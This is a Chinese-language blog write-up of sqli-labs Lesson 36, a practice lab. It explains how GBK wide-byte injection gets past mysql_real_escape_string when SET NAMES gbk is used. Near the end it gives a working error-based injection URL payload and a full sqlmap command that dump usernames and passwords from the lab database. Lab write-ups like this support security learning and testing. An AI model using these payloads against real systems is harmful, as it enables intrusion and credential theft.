---
title: sqli-labs lession-36 GET-绕过Mysql_real_escape_string
date: 2018-10-15 20:50:48
tags: [sqli-labs]
categories: sql注入
---

# sqli-labs lession-36 GET-绕过Mysql_real_escape_string

---

## 登录界面

![001](/img/sql/Lesson-36/001.png)

## 分析

![002](/img/sql/Lesson-36/002.png)

![003](/img/sql/Lesson-36/003.png)

mysql_query( "SET NAMES gbk");这一句的作用能使三个字符集（客户端、连接层、结果集）都是GBK编码,分别对应`SET character_set_client = utf8;`，`SET character_set_results = utf8;`，`SET character_set_connection = utf8;`与AddSlashes不同的是mysql_query会考虑到连接的字符集。按理来说应该避免了宽字节绕过,下面查找下原因。

使用 `Show variables like "cha_%";`查看当前字符集。

![004](/img/sql/Lesson-36/004.png)

修改源代码临时使`security`字符集为gbk。

`mysql_query("SET character_set_connection=gbk, character_set_results=gbk,character_set_client=binary;");`

![005](/img/sql/Lesson-36/005.png)

修改后使用宽字节注入,发现执行失败。

![006](/img/sql/Lesson-36/006.png)

宽字节注入发生的位置就是`PHP发送请求到MYSQL时字符集使用character_set_client设置值进行了一次编码`，然后服务器会根据character_set_connection把请求进行转码，从character_set_client转成character_set_connection，然后更新到数据库的时候，再转化成字段所对应的编码。

```
addSlashes函数:
%df%27===>(addslashes)====>%df%5c%27====>(GBK)====>運’
用户输入==>过滤函数==>代码层的$sql==>mysql处理请求==>mysql中的sql

mysql_real_escape_string函数：
如果mysql数据库中字符集也为gbk,与mysql_query("SET NAMES gbk");的编码相同就不会把%df和%5c拼接为一个宽字节的问题

```

而原来这里发生宽字节注入的原因是
`mysql_query( "SET NAMES gbk");`设置字符集后,`mysql_real_escape_string` 函数没有立即调用更新的字符集，而把原来的编码拿来用了。

## 注入

对于使用`mysql_query( "SET NAMES gbk");`的情况，如果mysql中编码不是gbk,依旧可以使用宽字节绕过。

其他的和前几课一样,这里直接拿上几课的payload来用。具体过程请看Lesson-32。

{% post_link sqli-labs-lession-32-GET-绕过自定义过滤器-向危险字符添加斜杠 点击查看Lesson-32%}

`http://192.168.75.132/sql/Less-36/?id=2%df' and extractvalue(null,concat(0x7e,(select concat(username,password) from users limit 0,1),0x7e))%23`

![007](/img/sql/Lesson-36/007.png)

## SQLMAP

一模一样直接上结果。

`sqlmap -u "http://192.168.75.132/sql/Less-36/?id=2'" --dbms mysql --technique E --tamper unmagicquotes.py --threads 10 -D security -T users --columns --dump`

![008](/img/sql/Lesson-36/008.png)

![009](/img/sql/Lesson-36/009.png)

![010](/img/sql/Lesson-36/010.png)